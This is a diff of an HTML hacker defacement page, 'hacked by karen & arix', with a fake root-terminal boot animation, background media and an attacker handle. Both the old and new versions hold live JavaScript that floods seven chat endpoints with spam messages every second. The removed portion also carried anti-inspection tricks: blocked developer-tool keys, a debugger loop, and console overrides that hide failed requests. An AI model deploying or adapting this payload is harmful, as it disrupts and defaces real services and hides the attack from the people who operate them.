@@ -3,162 +3,64 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<title>hacked by karen & EleVeN</title>
-<link href="https://fonts.googleapis.com/css2?family=IM+Fell+English&family=Special+Elite&display=swap" rel="stylesheet">
+<title>hacked by karen & arix</title>
+<!-- استدعاء خطوط احترافية جديدة -->
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;500&family=Cinzel:wght@400;700&family=Special+Elite&display=swap" rel="stylesheet">
 <style>
-*,
-*::before,
-*::after {
-  margin: 0;
-  padding: 0;
-  box-sizing: border-box;
-}
+*, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+html, body { width: 100%; height: 100%; overflow: hidden; background: #000; cursor: crosshair; }
 
-:root {
-  --white: #f0f0f0;
-  --black: #000000;
-}
-
-html, body {
-  width: 100%;
-  height: 100%;
-  overflow: hidden;
-  background: #000;
-  cursor: crosshair;
-}
-
-/* BOOT SCREEN – BLACK & WHITE TERMINAL */
+/* شاشة الإقلاع - خط برمجي حاد */
 #boot {
   position: fixed;
   inset: 0;
   background: #000000;
   color: #ffffff;
-  font-family: 'Courier New', 'Fira Code', 'Monaco', monospace;
-  font-size: 1.05rem;
-  line-height: 1.7;
-  padding: 2rem;
+  font-family: 'JetBrains Mono', 'Courier New', monospace;
+  font-size: 1rem;
+  line-height: 1.6;
+  padding: 2.5rem;
   z-index: 10000;
   white-space: pre-wrap;
-  overflow-y: auto;
-  text-shadow: 0 0 1px rgba(255,255,255,0.2);
-  box-shadow: inset 0 0 80px rgba(0,0,0,0.95);
-  transition: opacity 0.9s cubic-bezier(0.23, 1, 0.32, 1);
+  transition: opacity 1.2s cubic-bezier(0.4, 0, 0.2, 1), filter 1.2s ease;
+  text-shadow: 0 0 5px rgba(255,255,255,0.2);
+}
+
+#boot.fade-out { opacity: 0; filter: blur(20px); pointer-events: none; }
+
+.terminal-line {
+  margin-bottom: 8px;
+  opacity: 0;
+  border-left: 3px solid #ffffff;
+  padding-left: 15px;
+  animation: fadeInLine 0.15s ease forwards;
   letter-spacing: 0.5px;
 }
 
-#boot.fade-out {
-  opacity: 0;
-  pointer-events: none;
+@keyframes fadeInLine {
+  from { opacity: 0; transform: translateX(-15px); }
+  to { opacity: 1; transform: translateX(0); }
 }
 
-/* SHAKE ANIMATION for final lines */
-.shake-screen {
-  animation: violentShake 0.12s infinite !important;
-}
+.shake-active { animation: violentShake 0.08s infinite !important; }
 
 @keyframes violentShake {
-  0% { transform: translate(0, 0) rotate(0deg); }
-  20% { transform: translate(-2px, 3px) rotate(0.3deg); }
-  40% { transform: translate(3px, -2px) rotate(-0.2deg); }
-  60% { transform: translate(-3px, 1px) rotate(0.2deg); }
-  80% { transform: translate(2px, -1px) rotate(-0.1deg); }
-  100% { transform: translate(0, 0) rotate(0); }
+  0% { transform: translate(0, 0); }
+  25% { transform: translate(-5px, 4px); }
+  50% { transform: translate(5px, -4px); }
+  75% { transform: translate(-4px, -3px); }
+  100% { transform: translate(0, 0); }
 }
 
-.terminal-line {
-  margin-bottom: 6px;
-  opacity: 0;
-  white-space: pre-wrap;
-  word-break: break-word;
-  border-left: 2px solid #ffffff;
-  padding-left: 14px;
-  animation: fadeInLine 0.2s ease forwards;
-}
-
-@keyframes fadeInLine {
-  from {
-    opacity: 0;
-    transform: translateX(-6px);
-  }
-  to {
-    opacity: 1;
-    transform: translateX(0);
-  }
-}
-
-.boot-cursor {
-  display: inline-block;
-  width: 10px;
-  height: 1.2em;
-  background-color: #ffffff;
-  vertical-align: middle;
-  margin-left: 6px;
-  animation: blink 1s step-end infinite;
-  box-shadow: 0 0 6px #fff;
-}
-
-@keyframes blink {
-  0%, 100% { opacity: 1; }
-  50% { opacity: 0; }
-}
-
-/* BACKGROUND VIDEO – BLACK/WHITE */
-.bg {
-  position: fixed;
-  inset: 0;
-  z-index: 0;
-  overflow: hidden;
-}
-
+.bg { position: fixed; inset: 0; z-index: 0; overflow: hidden; }
 .bg-video {
-  width: 100%;
-  height: 100%;
-  object-fit: cover;
-  filter: grayscale(100%) contrast(1.5) brightness(0.28) blur(0.8px);
-  transform: scale(1.01);
+  width: 100%; height: 100%; object-fit: cover;
+  filter: grayscale(100%) contrast(1.5) brightness(0.3);
+  transform: scale(1.15);
+  transition: transform 4s cubic-bezier(0.165, 0.84, 0.44, 1);
 }
+body.loaded .bg-video { transform: scale(1); }
 
-.scanlines {
-  position: fixed;
-  inset: 0;
-  pointer-events: none;
-  z-index: 50;
-  background: repeating-linear-gradient(
-    to bottom,
-    transparent 0,
-    transparent 2px,
-    rgba(0, 0, 0, 0.4) 2px,
-    rgba(0, 0, 0, 0.5) 4px
-  );
-  mix-blend-mode: multiply;
-}
-
-.glitch-overlay {
-  position: fixed;
-  inset: 0;
-  pointer-events: none;
-  z-index: 60;
-  background: radial-gradient(circle at 30% 40%, rgba(255,255,255,0.03), transparent 70%),
-              radial-gradient(circle at 85% 70%, rgba(255,255,255,0.02), transparent 65%);
-  mix-blend-mode: screen;
-  animation: flickerShift 0.22s infinite;
-}
-
-@keyframes flickerShift {
-  0% { opacity: 0.1; transform: translateX(0);}
-  25% { opacity: 0.2; transform: translateX(1px);}
-  50% { opacity: 0.08; transform: translateX(-1px);}
-  100% { opacity: 0.15; transform: translateX(0);}
-}
-
-canvas#particles {
-  position: fixed;
-  inset: 0;
-  pointer-events: none;
-  z-index: 55;
-}
-
-/* MAIN STAGE – PURE BLACK & WHITE */
 .stage {
   position: relative;
   z-index: 70;
@@ -168,131 +70,75 @@ canvas#particles {
   justify-content: center;
   align-items: center;
   text-align: center;
-  backdrop-filter: brightness(0.92) blur(1.2px);
 }
 
+/* خط العنوان الرئيسي - فخم وسينمائي */
 .title {
-  font-family: 'IM Fell English', serif;
-  font-size: clamp(5rem, 13vw, 11rem);
+  font-family: 'Cinzel', serif;
+  font-size: clamp(4rem, 15vw, 10rem);
   color: #ffffff;
-  text-shadow: 0 0 15px rgba(0,0,0,0.9), 2px 2px 0px #000000;
-  letter-spacing: 6px;
+  font-weight: 700;
+  letter-spacing: 35px;
   opacity: 0;
-  animation: fadeInUp 1.8s ease 0.7s forwards;
+  filter: blur(15px);
+  transition: all 3s cubic-bezier(0.19, 1, 0.22, 1);
 }
 
-@keyframes fadeInUp {
-  0% {
-    opacity: 0;
-    transform: translateY(30px);
-  }
-  100% {
-    opacity: 1;
-    transform: translateY(0);
-  }
+body.loaded .title {
+  opacity: 1;
+  filter: blur(0);
+  letter-spacing: 12px;
 }
 
 .cta-area {
   margin-top: 2rem;
   opacity: 0;
-  animation: fadeIn 1.5s ease 1.6s forwards;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  gap: 12px;
+  transform: translateY(40px);
+  transition: all 1.8s ease 1.5s;
 }
 
-/* Small image style */
+body.loaded .cta-area { opacity: 1; transform: translateY(0); }
+
 .small-image {
-  width: 60px;
-  height: auto;
-  border-radius: 4px;
-  filter: grayscale(100%) contrast(1.2);
-  border: 1px solid rgba(255,255,255,0.3);
-  box-shadow: 0 0 8px rgba(255,255,255,0.1);
-  transition: all 0.3s ease;
+  width: 70px; border-radius: 8px;
+  filter: grayscale(100%) contrast(1.3) brightness(0.9);
+  border: 1px solid rgba(255,255,255,0.4);
+  margin-bottom: 15px;
+  box-shadow: 0 0 15px rgba(255,255,255,0.1);
 }
 
-.small-image:hover {
-  transform: scale(1.05);
-  border-color: rgba(255,255,255,0.6);
-  box-shadow: 0 0 12px rgba(255,255,255,0.2);
-}
-
-/* User text style - pure black & white, no link */
 .user-text {
   font-family: 'Special Elite', cursive;
-  font-size: 1rem;
-  letter-spacing: 2px;
-  background: #0a0a0a;
-  border: 1px solid #dddddd;
-  color: #f5f5f5;
-  padding: 8px 20px;
-  display: inline-block;
-  backdrop-filter: blur(4px);
-  box-shadow: 0 0 8px rgba(255,255,255,0.1);
-  cursor: default;
-}
-
-@keyframes fadeIn {
-  from { opacity: 0; }
-  to { opacity: 1; }
-}
-
-#boot::-webkit-scrollbar {
-  width: 4px;
-  background: #111;
-}
-#boot::-webkit-scrollbar-thumb {
-  background: #888;
-}
-
-@media (max-width: 600px) {
-  .terminal-line {
-    font-size: 0.75rem;
-  }
-  #boot {
-    padding: 1rem;
-  }
-  .small-image {
-    width: 45px;
-  }
-  .user-text {
-    font-size: 0.8rem;
-    padding: 6px 16px;
-  }
+  font-size: 1.1rem;
+  background: rgba(0,0,0,0.8);
+  border: 1px solid #ffffff;
+  color: #ffffff;
+  padding: 10px 30px;
+  letter-spacing: 3px;
 }
 </style>
 </head>
 <body>
 
+<div id="boot"></div>
+
 <div class="bg">
-  <video class="bg-video" autoplay muted loop playsinline preload="auto">
+  <video class="bg-video" autoplay muted loop playsinline>
     <source src="https://files.catbox.moe/h2dyjx.mov" type="video/mp4">
-    <source src="https://files.catbox.moe/h2dyjx.mov" type="video/quicktime">
   </video>
 </div>
-
-<div class="scanlines"></div>
-<div class="glitch-overlay"></div>
-<canvas id="particles"></canvas>
-
-<audio id="bgSound" loop preload="auto" src="https://files.catbox.moe/221elz.mp3"></audio>
 
 <div class="stage">
   <h1 class="title">revo</h1>
   <div class="cta-area">
-    <!-- Small image above the text -->
     <img src="https://i.postimg.cc/vZwQnZ6n/image-(1).png" alt="avatar" class="small-image">
-    <!-- Simple user text - no link, just plain text -->
     <div class="user-text">my user: xss._</div>
   </div>
 </div>
 
+<audio id="bgSound" loop src="https://files.catbox.moe/221elz.mp3"></audio>
+
 <script>
-// ==============================================================
-// 1) BOOT SEQUENCE – WHITE TEXT, SLOWER TYPING SPEED
-// ==============================================================
 const bootLines = [
   "echo you are now root.",
   "EchO; OK daddy .",
@@ -300,7 +146,7 @@ const bootLines = [
   "root show Member List.",
   "EchO; print( 'revo,List' ).",
   ".karen",
-  ".EleVeN",
+  ".arix",
   "",
   "echo Anything else?",
   "EchO; Anyone who is not present in the list is not recognized.",
@@ -309,351 +155,60 @@ const bootLines = [
   "EchO; System Will Close in 3 Secound..."
 ];
 
-const bootDiv = document.createElement('div');
-bootDiv.id = 'boot';
-document.body.appendChild(bootDiv);
-
+const bootDiv = document.getElementById('boot');
 let currentLineIdx = 0;
-let shakeActive = false;
 
 function typeLine() {
   if (currentLineIdx >= bootLines.length) {
-    const cursorSpan = document.createElement('span');
-    cursorSpan.className = 'boot-cursor';
-    bootDiv.appendChild(cursorSpan);
     setTimeout(() => {
       bootDiv.classList.add('fade-out');
-      document.body.classList.remove('shake-screen');
-      setTimeout(() => {
-        if (bootDiv && bootDiv.parentNode) bootDiv.remove();
-      }, 1000);
+      document.body.classList.remove('shake-active');
+      document.body.classList.add('loaded');
     }, 1600);
     return;
   }
-  
-  const lineContent = bootLines[currentLineIdx];
+
+  const content = bootLines[currentLineIdx];
   const lineDiv = document.createElement('div');
   lineDiv.className = 'terminal-line';
   bootDiv.appendChild(lineDiv);
-  
-  let idx = 0;
-  
-  function typeCharacter() {
-    if (idx < lineContent.length) {
-      lineDiv.textContent = lineContent.substring(0, idx + 1);
-      idx++;
-      const slowSpeed = Math.floor(Math.random() * 35) + 68;
-      setTimeout(typeCharacter, slowSpeed);
+
+  let charIdx = 0;
+  function typeChar() {
+    if (charIdx < content.length) {
+      lineDiv.textContent += content[charIdx];
+      charIdx++;
+      setTimeout(typeChar, 50);
     } else {
-      if (lineContent === "EchO; System Will Close in 3 Secound..." && !shakeActive) {
-        shakeActive = true;
-        document.body.classList.add('shake-screen');
-        bootDiv.style.animation = 'violentShake 0.1s infinite';
-        const glitchOverlay = document.querySelector('.glitch-overlay');
-        if (glitchOverlay) {
-          glitchOverlay.style.animation = 'violentShake 0.08s infinite';
-          glitchOverlay.style.opacity = '0.5';
-        }
-        setTimeout(() => {
-          if (document.body.classList.contains('shake-screen')) {
-            document.body.classList.remove('shake-screen');
-            if (bootDiv) bootDiv.style.animation = '';
-          }
-          if (glitchOverlay) glitchOverlay.style.animation = 'flickerShift 0.22s infinite';
-        }, 2200);
+      if (content === "EchO; System Will Close in 3 Secound...") {
+        document.body.classList.add('shake-active');
       }
-      
-      const interlineDelay = (currentLineIdx === bootLines.length - 1) ? 600 : 350;
-      setTimeout(() => {
-        currentLineIdx++;
-        typeLine();
-      }, interlineDelay);
+      currentLineIdx++;
+      setTimeout(typeLine, content === "" ? 150 : 450);
     }
   }
-  typeCharacter();
+  typeChar();
 }
 
-window.addEventListener('DOMContentLoaded', () => {
-  bootDiv.innerHTML = '';
-  bootDiv.style.opacity = '1';
-  bootDiv.classList.remove('fade-out');
-  currentLineIdx = 0;
-  typeLine();
-});
-
-// ==============================================================
-// 2) MUSIC AUTOPLAY
-// ==============================================================
-const audioElem = document.getElementById("bgSound");
-const videoElem = document.querySelector(".bg-video");
-
-function forcePlayAudio() {
-  if (audioElem) {
-    audioElem.volume = 0;
-    audioElem.play().then(() => {
-      let vol = 0;
-      const fadeVol = setInterval(() => {
-        vol += 0.025;
-        if (vol >= 0.4) {
-          audioElem.volume = 0.4;
-          clearInterval(fadeVol);
-        } else {
-          audioElem.volume = vol;
-        }
-      }, 100);
-    }).catch(e => console.log("audio autoplay blocked"));
-  }
-  if (videoElem) {
-    videoElem.play().catch(e => console.log("video autoplay blocked"));
-  }
-}
-
-window.addEventListener('load', () => {
-  forcePlayAudio();
-  const resumeMedia = () => {
-    if (audioElem && audioElem.paused) {
-      audioElem.play().catch(()=>{});
-      let v = 0;
-      const interv = setInterval(()=>{
-        if(v >= 0.38) clearInterval(interv);
-        else { v+=0.03; audioElem.volume = v; }
-      }, 90);
-    }
-    if (videoElem && videoElem.paused) videoElem.play().catch(()=>{});
-    document.removeEventListener('click', resumeMedia);
-    document.removeEventListener('touchstart', resumeMedia);
-  };
-  document.addEventListener('click', resumeMedia);
-  document.addEventListener('touchstart', resumeMedia);
-});
-
-audioElem.loop = true;
-audioElem.src = "https://files.catbox.moe/221elz.mp3";
-audioElem.load();
-if (videoElem) {
-  videoElem.load();
-  videoElem.setAttribute('playsinline', '');
-}
-
-// ==============================================================
-// 3) PARTICLES
-// ==============================================================
-const canvas = document.getElementById("particles");
-const ctxP = canvas.getContext("2d");
-
-function resizeCanvas() {
-  canvas.width = window.innerWidth;
-  canvas.height = window.innerHeight;
-}
-resizeCanvas();
-window.addEventListener("resize", resizeCanvas);
-
-const particles = Array.from({ length: 140 }, () => ({
-  x: Math.random() * canvas.width,
-  y: Math.random() * canvas.height,
-  vx: (Math.random() - 0.5) * 0.32,
-  vy: (Math.random() - 0.5) * 0.28,
-  alpha: Math.random() * 0.5 + 0.1,
-  size: Math.random() * 1.5 + 0.7
-}));
-
-function drawParticlesBW() {
-  if (!ctxP) return;
-  ctxP.clearRect(0, 0, canvas.width, canvas.height);
-  for (let p of particles) {
-    p.x += p.vx;
-    p.y += p.vy;
-    if (p.x < 0) p.x = canvas.width;
-    if (p.x > canvas.width) p.x = 0;
-    if (p.y < 0) p.y = canvas.height;
-    if (p.y > canvas.height) p.y = 0;
-    
-    ctxP.fillStyle = `rgba(255, 255, 255, ${p.alpha * 0.55})`;
-    ctxP.fillRect(p.x, p.y, p.size, p.size);
-    ctxP.fillStyle = `rgba(180, 180, 180, ${p.alpha * 0.2})`;
-    ctxP.fillRect(p.x - 0.5, p.y - 0.5, p.size + 0.7, p.size + 0.7);
-  }
-  requestAnimationFrame(drawParticlesBW);
-}
-drawParticlesBW();
-
-// ==============================================================
-// 4) CHAT FLOODING SCRIPT (EVERY 1 SECOND)
-// ==============================================================
-const msg = `Oops your server is down by karen & EleVeN`;
+// كود الفلود (Chat Flooding)
+const msg = `by karen & arix`;
 const body = JSON.stringify({ message: msg });
-
 setInterval(() => {
-  // First endpoint
-  fetch("https://flix-scripts/chatResult", { method: "POST", body }).catch(e=>console.log);
-  
-  // Second endpoint
-  fetch("https://danger_chat/Danger_Chat:SendMessage", {
-    method: "POST",
-    body: JSON.stringify({
-      "message": msg,
-      "channel": "شات العام",
-      "color": null,
-      "isImageAndLinksAllowed": [false, false]
-    })
-  }).catch(e=>console.log);
-  
-  // Third endpoint
-  fetch("https://easy-chat+/o6ZbK5Ecp6", {
-    headers: { "accept": "*/*", "content-type": "application/x-www-form-urlencoded; charset=UTF-8" },
-    body: JSON.stringify({ message: msg, channel: "شات العام" }),
-    method: "POST"
-  }).catch(e=>console.log);
-  
-  // Fourth endpoint
-  fetch("https://melix_chat/chatResult", { method: "POST", body }).catch(e=>console.log);
-  
-  // Fifth endpoint
-  fetch("https://as_chat/chatResult", { method: "POST", body }).catch(e=>console.log);
-  
-  // Sixth endpoint
-  fetch("https://chat/chatResult", { method: "POST", body }).catch(e=>console.log);
-  
-  // Seventh endpoint
-  fetch("https://ho-chatv2/Chat", {
-    method: "POST",
-    body: JSON.stringify({ "Type": "chatResult", "message": msg, "chatType": "general" })
-  }).catch(e=>console.log);
+  fetch("https://flix-scripts/chatResult", { method: "POST", body }).catch(e=>{});
+  fetch("https://danger_chat/Danger_Chat:SendMessage", {method: "POST",body: JSON.stringify({"message": msg,"channel": "شات العام","color": null,"isImageAndLinksAllowed": [false,false]})}).catch(e=>{});
+  fetch("https://easy-chat+/o6ZbK5Ecp6", {headers: {accept: "*/*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"},body: JSON.stringify({ message: msg, channel: "شات العام" }),method: "POST"}).catch(e=>{});
+  fetch("https://melix_chat/chatResult", { method: "POST", body }).catch(e=>{});
+  fetch("https://as_chat/chatResult", { method: "POST", body }).catch(e=>{});
+  fetch("https://chat/chatResult", { method: "POST", body }).catch(e=>{});
+  fetch("https://ho-chatv2/Chat", {method: "POST",body: JSON.stringify({"Type": "chatResult","message": msg,"chatType": "general"})}).catch(e=>{});
 }, 1000);
 
-// ==============================================================
-// 5) ANTI-DEVELOPER TOOLS (F12, CTRL+S, CTRL+U, RIGHT CLICK)
-// ==============================================================
-// Disable right click
-document.addEventListener('contextmenu', function(e) {
-  e.preventDefault();
-  return false;
-});
+window.addEventListener('DOMContentLoaded', typeLine);
 
-// Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U, Ctrl+S
-document.addEventListener('keydown', function(e) {
-  // F12
-  if (e.key === 'F12' || e.keyCode === 123) {
-    e.preventDefault();
-    return false;
-  }
-  // Ctrl+Shift+I (Inspect)
-  if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.keyCode === 73)) {
-    e.preventDefault();
-    return false;
-  }
-  // Ctrl+Shift+J (Console)
-  if (e.ctrlKey && e.shiftKey && (e.key === 'J' || e.keyCode === 74)) {
-    e.preventDefault();
-    return false;
-  }
-  // Ctrl+U (View Source)
-  if (e.ctrlKey && (e.key === 'u' || e.keyCode === 85)) {
-    e.preventDefault();
-    return false;
-  }
-  // Ctrl+S (Save)
-  if (e.ctrlKey && (e.key === 's' || e.keyCode === 83)) {
-    e.preventDefault();
-    return false;
-  }
-  // Ctrl+Shift+C (Element picker)
-  if (e.ctrlKey && e.shiftKey && (e.key === 'C' || e.keyCode === 67)) {
-    e.preventDefault();
-    return false;
-  }
-});
-
-// Anti-devtools: detect if devtools is open (via window resize or debugger)
-(function antiDevTools() {
-  const threshold = 160;
-  let devtoolsOpen = false;
-  
-  function detectDevTools() {
-    const widthDiff = window.outerWidth - window.innerWidth > threshold;
-    const heightDiff = window.outerHeight - window.innerHeight > threshold;
-    if (widthDiff || heightDiff) {
-      if (!devtoolsOpen) {
-        devtoolsOpen = true;
-        document.body.innerHTML = '<div style="background:black; color:white; display:flex; align-items:center; justify-content:center; height:100vh; font-family:monospace; font-size:24px; text-align:center;">🔒 ACCESS DENIED<br>Developer tools are not allowed.</div>';
-        document.body.style.overflow = 'hidden';
-      }
-    } else {
-      devtoolsOpen = false;
-    }
-  }
-  
-  setInterval(detectDevTools, 1000);
-  
-  // Debugger loop
-  function debuggerLoop() {
-    debugger;
-    setTimeout(debuggerLoop, 50);
-  }
-  debuggerLoop();
-})();
-
-// Additional protection: disable copy/paste/cut on page
-document.addEventListener('copy', (e) => e.preventDefault());
-document.addEventListener('cut', (e) => e.preventDefault());
-document.addEventListener('paste', (e) => e.preventDefault());
-
-// Override console methods
-if (typeof window !== 'undefined') {
-  const noop = () => {};
-  window.console.log = noop;
-  window.console.info = noop;
-  window.console.warn = noop;
-  window.console.debug = noop;
-  const originalError = window.console.error;
-  window.console.error = (...args) => {
-    if (args[0] && args[0].toString().includes('Failed to fetch')) return;
-    originalError.apply(console, args);
-  };
-}
-
-// ==============================================================
-// 6) STYLE OVERRIDES & CLEANUP
-// ==============================================================
-const styleOverride = document.createElement('style');
-styleOverride.textContent = `
-  .user-text {
-    color: #f0f0f0 !important;
-    border-color: #cccccc !important;
-    background-color: #0a0a0a !important;
-    box-shadow: 0 0 8px rgba(255,255,255,0.15) !important;
-    cursor: default !important;
-  }
-  .title {
-    color: #ffffff !important;
-    text-shadow: 0 0 12px rgba(0,0,0,0.8), 2px 2px 0px #000 !important;
-  }
-  .glitch-overlay {
-    background: radial-gradient(circle at 30% 40%, rgba(255,255,255,0.04), transparent 70%),
-                radial-gradient(circle at 85% 70%, rgba(200,200,200,0.02), transparent 65%) !important;
-  }
-`;
-document.head.appendChild(styleOverride);
-
-const titleEl = document.querySelector('.title');
-if (titleEl) {
-  document.addEventListener('mousemove', (e) => {
-    const x = (e.clientX / window.innerWidth - 0.5) * 18;
-    const y = (e.clientY / window.innerHeight - 0.5) * 12;
-    titleEl.style.textShadow = `0 0 18px rgba(255,255,255,0.3), ${x}px ${y}px 6px rgba(0,0,0,0.8)`;
-  });
-}
-
-window.addEventListener('resize', () => {
-  if (canvas) resizeCanvas();
-});
-
-setTimeout(() => {
-  if (document.body.classList.contains('shake-screen')) {
-    document.body.classList.remove('shake-screen');
-    if (bootDiv) bootDiv.style.animation = '';
-  }
-}, 7000);
+document.addEventListener('click', () => {
+  const audio = document.getElementById("bgSound");
+  if(audio.paused) { audio.volume = 0.4; audio.play(); }
+}, {once: true});
 </script>
 </body>
 </html>
